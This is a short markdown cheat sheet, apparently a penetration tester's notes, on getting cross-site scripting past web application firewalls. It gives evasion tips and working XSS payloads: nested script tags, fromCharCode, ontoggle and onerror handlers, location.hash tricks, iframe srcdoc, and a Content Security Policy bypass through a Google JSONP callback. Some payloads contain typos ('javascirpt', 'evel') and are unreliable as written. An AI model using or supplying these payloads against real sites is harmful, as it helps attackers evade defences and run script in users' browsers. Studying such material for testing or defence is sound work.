# WAF Bypass

How to bypass a WAF to achieve XSS?

- if the WAF is well-known, search in the net to get the bypass (twitter too)
- If you inject your payload and it is removed, try to add inside the tag `<scr<script>ipt>`
- if it encodes fuzz the js files
- try to use fromCharCode function when the quote is filter
- if you want to discover a payload, pay attention to following notes
    - WAFs commonly use regex rulesets which detect malicious inputs
    - Fuzz to discover which part of the payload is matched by the WAF’s ruleset
    - WAFs commonly are not updated, the newer HTML tag is, the more chance you have
    
    ```html
    <details/open/ontoggle=JS>
    ```
    
    - if you cannot make alert, try to put the payload after `#`, since part is not sent to the server
    
    ```html
    <details/open/ontoggle="location.hash.split('#')[1]">#javascirpt:alert(`XSS`)
    <x/onclick=a=evel,a('/'+location.hash)>here<x>#/-alert(origin)
    ```
    
    - Expand your payload to confuse the WAF
    
    ```html
    <img src"/" =_=" title="onerror='prompt(1)'">
    <--`<img/src=` onerror=alert(1)> --!>
    ```
    
    - Bypass onxxx
    
    ```bash
    onxxx if filter?
    try to fuzz attributes
    for e.g. srcdoc in iframe, href in a and so on
    
    <iframe srcdoc=<script>prompt``</script></iframe>
    ```
    
    - CSP Bypass
    
    ```bash
    <script+src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"</script>
    ```